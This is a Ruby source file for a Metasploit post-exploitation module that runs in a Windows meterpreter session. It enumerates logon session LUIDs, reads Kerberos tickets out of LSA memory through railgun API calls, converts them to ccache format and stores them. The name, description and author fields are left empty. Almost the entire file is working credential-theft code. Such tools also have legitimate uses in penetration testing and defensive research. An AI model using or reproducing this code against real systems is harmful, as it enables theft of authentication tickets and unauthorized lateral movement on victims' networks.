##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/kerberos/model/kerberos_flags'
require 'rex/proto/kerberos/model/ticket_flags'

class MetasploitModule < Msf::Post
  include Msf::Post::Process
  include Msf::Post::Windows::Lsa

  # https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ne-ntsecapi-security_logon_type
  SECURITY_LOGON_TYPE = {
    0 => 'UndefinedLogonType',
    2 => 'Interactive',
    3 => 'Network',
    4 => 'Batch',
    5 => 'Service',
    6 => 'Proxy',
    7 => 'Unlock',
    8 => 'NetworkCleartext',
    9 => 'NewCredentials',
    10 => 'RemoteInteractive',
    11 => 'CachedInteractive',
    12 => 'CachedRemoteInteractive',
    13 => 'CachedUnlock'
  }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
        ],
        'Platform' => ['win'],
        'SessionTypes' => %w[meterpreter],
        'Actions' => [
          ['DUMP_TICKETS', { 'Description' => 'Dump the Kerberos tickets' }],
          ['ENUM_LUIDS', { 'Description' => 'Enumerate session logon LUIDs' }],
          ['SHOW_LUID', { 'Description' => 'Show the current LUID' }],
        ],
        'DefaultAction' => 'DUMP_TICKETS',
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_railgun_api
              stdapi_railgun_memread
              stdapi_railgun_memwrite
            ]
          }
        }
      )
    )
  end

  def run
    @indent_level = 0
    unless session.native_arch == ARCH_X64
      fail_with(Failure::NoTarget, 'This module only support x64 sessions.')
    end

    send("action_#{action.name.downcase}")
  end

  def action_dump_tickets
    luid = get_current_luid
    print_status("Current LUID: #{luid}")

    dump_for_luid(luid)
  end

  def action_enum_luids
    current_luid = get_current_luid
    luids = lsa_enumerate_logon_sessions
    fail_with(Failure::Unknown, 'Failed to enumerate logon sessions.') if luids.nil?
    luids.each do |luid|
      print_status("#{luid} #{luid == current_luid ? ' (Current)' : ''}")
    end
  end

  def action_show_luid
    luid = get_current_luid
    print_status("Current LUID: #{luid}")
  end

  def dump_for_luid(luid)
    logon_session_data_ptr = lsa_get_logon_session_data(luid)
    return unless logon_session_data_ptr

    handle = lsa_register_logon_process
    fail_with(Failure::Unknown, 'Failed to obtain a handle to LSA.') if handle.nil?
    print_status("LSA Handle: 0x#{handle.to_s(16).rjust(16, '0')}")
    auth_package = lsa_lookup_authentication_package(handle, 'Kerberos')
    if auth_package.nil?
      lsa_deregister_logon_process(handle)
      fail_with(Failure::Unknown, 'Failed to lookup the Kerberos authentication package.')
    end

    sid = '???'
    if logon_session_data_ptr.contents.psid != 0
      result = session.railgun.advapi32.ConvertSidToStringSidA(logon_session_data_ptr.contents.psid.to_i, 4)
      if result
        sid = session.railgun.util.read_string(result['StringSid'])
        session.railgun.kernel32.LocalFree(result['StringSid'])
      end
    end

    indented_print do
      print_status("UserName:              #{read_lsa_unicode_string(logon_session_data_ptr.contents.user_name)}")
      print_status("Domain:                #{read_lsa_unicode_string(logon_session_data_ptr.contents.logon_domain)}")
      print_status("LogonId:               #{logon_session_data_ptr.contents.logon_id}")
      print_status("Session:               #{logon_session_data_ptr.contents.session}")
      print_status("UserSID:               #{sid}")
      print_status("AuthenticationPackage: #{read_lsa_unicode_string(logon_session_data_ptr.contents.authentication_package)}")
      print_status("LogonType:             #{SECURITY_LOGON_TYPE.fetch(logon_session_data_ptr.contents.logon_type.to_i, '???')} (#{logon_session_data_ptr.contents.logon_type.to_i})")
      print_status("LogonTime:             #{logon_session_data_ptr.contents.logon_time.to_datetime}")
      print_status("LogonServer:           #{read_lsa_unicode_string(logon_session_data_ptr.contents.logon_server)}")
      print_status("LogonServerDNSDomain:  #{read_lsa_unicode_string(logon_session_data_ptr.contents.dns_domain_name)}")
      print_status("UserPrincipalName:     #{read_lsa_unicode_string(logon_session_data_ptr.contents.upn)}")
      session.railgun.secur32.LsaFreeReturnBuffer(logon_session_data_ptr.value)

      query_tkt_cache_req = KERB_QUERY_TKT_CACHE_REQUEST.new(message_type: 14, logon_id: logon_session_data_ptr.contents.logon_id)
      query_tkt_cache_res_ptr = lsa_call_authentication_package(handle, auth_package, query_tkt_cache_req)
      if query_tkt_cache_res_ptr
        dump_session_tickets(handle, auth_package, logon_session_data_ptr, query_tkt_cache_res_ptr)
        session.railgun.secur32.LsaFreeReturnBuffer(query_tkt_cache_res_ptr.value)
      end
    end

    lsa_deregister_logon_process(handle)
  end

  def dump_session_tickets(handle, auth_package, logon_session_data_ptr, query_tkt_cache_res_ptr)
    tkt_cache = KERB_QUERY_TKT_CACHE_RESPONSE_x64.read(query_tkt_cache_res_ptr.contents)
    tkt_cache.tickets.each_with_index do |ticket, index|
      server_name = read_lsa_unicode_string(ticket.server_name)
      server_name_wz = session.railgun.util.str_to_uni_z(server_name)
      print_status("Ticket[#{index}]")
      indented_print do
        print_status("ClientName:     #{read_lsa_unicode_string(ticket.client_name)}")
        print_status("ServerName:     #{server_name}")
        print_status("StartTime:      #{ticket.start_time.to_datetime}")
        print_status("EndTime:        #{ticket.end_time.to_datetime}")
        print_status("RenewTime:      #{ticket.renew_time.to_datetime}")
        print_status("EncryptionType: #{Rex::Proto::Kerberos::Crypto::Encryption::IANA_NAMES.fetch(ticket.encryption_type.to_i, ticket.encryption_type.to_i)}")
        print_status("TicketFlags:    #{Rex::Proto::Kerberos::Model::TicketFlags.new(ticket.ticket_flags.to_i).enabled_flag_names.map(&:to_s).join(', ')}")

        retrieve_tkt_req = KERB_RETRIEVE_TKT_REQUEST_x64.new(message_type: 8, logon_id: logon_session_data_ptr.contents.logon_id, cache_options: 8)
        ptr = session.railgun.util.alloc_and_write_data(retrieve_tkt_req.to_binary_s + server_name_wz)
        next if ptr.nil?

        retrieve_tkt_req.target_name.len = server_name_wz.length - 2
        retrieve_tkt_req.target_name.maximum_len = server_name_wz.length
        retrieve_tkt_req.target_name.buffer = ptr + retrieve_tkt_req.num_bytes
        session.railgun.memwrite(ptr, retrieve_tkt_req)
        retrieve_tkt_res_ptr = lsa_call_authentication_package(handle, auth_package, ptr, submit_buffer_length: retrieve_tkt_req.num_bytes + server_name_wz.length)
        session.railgun.util.free_data(ptr)
        next if retrieve_tkt_res_ptr.nil?

        retrieve_tkt_res = KERB_RETRIEVE_TKT_RESPONSE_x64.read(retrieve_tkt_res_ptr.contents)
        if retrieve_tkt_res.ticket.encoded_ticket != 0
          kirbi_ticket = session.railgun.memread(retrieve_tkt_res.ticket.encoded_ticket, retrieve_tkt_res.ticket.encoded_ticket_size)
          ccache_ticket = kirbi_to_ccache(kirbi_ticket)
          Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ccache_ticket, framework_module: self)
        end
        session.railgun.secur32.LsaFreeReturnBuffer(retrieve_tkt_res_ptr.value)
      end
    end
  end

  def kirbi_to_ccache(input)
    krb_cred = Rex::Proto::Kerberos::Model::KrbCred.decode(input)
    Msf::Exploit::Remote::Kerberos::TicketConverter.kirbi_to_ccache(krb_cred)
  end

  def get_current_luid
    luid = get_token_statistics&.authentication_id
    fail_with(Failure::Unknown, 'Failed to obtain the current LUID.') unless luid
    luid
  end

  def get_token_statistics(token: nil)
    if token.nil?
      result = session.railgun.advapi32.OpenThreadToken(-2, session.railgun.const('TOKEN_QUERY'), false, 4)
      unless result['return']
        error = ::WindowsError::Win32.find_by_retval(result['GetLastError']).first
        unless error == ::WindowsError::Win32::ERROR_NO_TOKEN
          print_error("Failed to open the current thread token. OpenThreadToken failed with: #{error}")
          return nil
        end

        result = session.railgun.advapi32.OpenProcessToken(-1, session.railgun.const('TOKEN_QUERY'), 4)
        unless result['return']
          error = ::WindowsError::Win32.find_by_retval(result['GetLastError']).first
          print_error("Failed to open the current process token. OpenProcessToken failed with: #{error}")
          return nil
        end
      end
      token = result['TokenHandle']
    end

    result = session.railgun.advapi32.GetTokenInformation(token, 10, TOKEN_STATISTICS.new.num_bytes, TOKEN_STATISTICS.new.num_bytes, 4)
    unless result['return']
      error = ::WindowsError::Win32.find_by_retval(result['GetLastError']).first
      print_error("Failed to obtain the token information. GetTokenInformation failed with: #{error}")
      return nil
    end
    TOKEN_STATISTICS.read(result['TokenInformation'])
  end

  def peer
    nil # drop the peer prefix from messages
  end

  def indented_print(&block)
    @indent_level += 1
    block.call
  ensure
    @indent_level -= 1
  end

  def print_prefix
    super + (' ' * @indent_level * 2)
  end
end
